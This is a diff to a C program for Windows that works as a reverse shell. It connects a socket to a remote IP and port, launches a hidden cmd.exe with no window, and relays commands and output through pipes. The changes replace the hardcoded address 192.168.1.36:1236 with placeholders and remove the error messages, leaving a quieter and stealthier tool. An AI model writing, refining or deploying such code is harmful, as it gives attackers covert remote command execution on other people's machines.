@@ -22,8 +22,8 @@ int main() {
     struct sockaddr_in sock_addr;
     char recvserver[8000];
     WSADATA wsa;
-    char ip_addr[] = "192.168.1.36";
-    int port = 1236;
+    char ip_addr[] = "0.0.0.0";
+    int port = 0000;
     SECURITY_ATTRIBUTES sa;
     HWND stealth;
     PROCESS_INFORMATION pi;
@@ -45,23 +45,11 @@ int main() {
 
     int connection = WSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);
 
-    if (!CreatePipe(&hRead_in, &hWrite_in, &sa, 0)) {
-        printf("Error creating input pipe\n");
-        return 1;
-    }
-    if (!SetHandleInformation(hWrite_in, HANDLE_FLAG_INHERIT, 0)) {
-        printf("Error setting handle information\n");
-        return 1;
-    }
+    CreatePipe(&hRead_in, &hWrite_in, &sa, 0);
+    SetHandleInformation(hWrite_in, HANDLE_FLAG_INHERIT, 0);
 
-    if (!CreatePipe(&hRead_out, &hWrite_out, &sa, 0)) {
-        printf("Error creating output pipe\n");
-        return 1;
-    }
-    if (!SetHandleInformation(hRead_out, HANDLE_FLAG_INHERIT, 0)) {
-        printf("Error setting handle information\n");
-        return 1;
-    }
+    CreatePipe(&hRead_out, &hWrite_out, &sa, 0);
+    SetHandleInformation(hRead_out, HANDLE_FLAG_INHERIT, 0);
 
    
     CreateChildProcess(&pi);
@@ -100,10 +88,8 @@ void CreateChildProcess(PROCESS_INFORMATION *pi) {
     si.hStdInput = hRead_in;
 
     
-    if (!CreateProcess(NULL, "cmd.exe /Q /K", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi)) {
-        printf("CreateProcess failed (%d)\n", GetLastError());
-        exit(1);
-    }
+    CreateProcess(NULL, "cmd.exe /Q /K", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi);
+       
 }
 
 void WriteToPipe(const char *recvserver) {
@@ -113,9 +99,8 @@ void WriteToPipe(const char *recvserver) {
     
     snprintf(command, sizeof(command), "%s\n", recvserver);
     
-    if (!WriteFile(hWrite_in, command, strlen(command), &dwWritten, NULL)) {
-        printf("Error writing to pipe\n");
-    }
+    WriteFile(hWrite_in, command, strlen(command), &dwWritten, NULL);
+        
 }
 
 void ReadFromPipe(SOCKET sock) {
@@ -127,10 +112,7 @@ void ReadFromPipe(SOCKET sock) {
 
     while (1) {
 
-        if (!PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL)) {
-            printf("Error checking pipe\n");
-            break;
-        }
+        PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL);
 
         if (bytesAvailable == 0) {
             bytecounter++;
